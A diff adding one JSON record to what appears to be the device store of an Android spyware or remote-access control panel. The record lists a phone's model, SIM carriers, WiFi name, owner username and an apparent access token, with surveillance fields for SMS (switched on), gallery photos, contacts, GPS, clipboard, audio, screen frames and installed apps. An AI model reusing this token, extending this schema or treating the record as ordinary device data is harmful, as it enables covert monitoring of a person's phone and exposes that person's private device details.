@@ -2812,5 +2812,37 @@
       ],
       "receivedAt": 1775735408355
     }
+  },
+  {
+    "deviceId": "aimlock_ac35b153",
+    "deviceName": "HP-LOCK99-F654",
+    "ownerUsername": "gehgtg17",
+    "token": "97ee8c2c43426deef64679153eede4cc",
+    "lastSeen": 1775737633616,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-09T12:27:13.616Z",
+    "deviceInfo": {
+      "model": "Xiaomi 2409BRN2CY",
+      "androidVersion": "Android 14",
+      "battery": 43,
+      "network": "WiFi: JAKWIFI",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Indosat Ooredoo"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
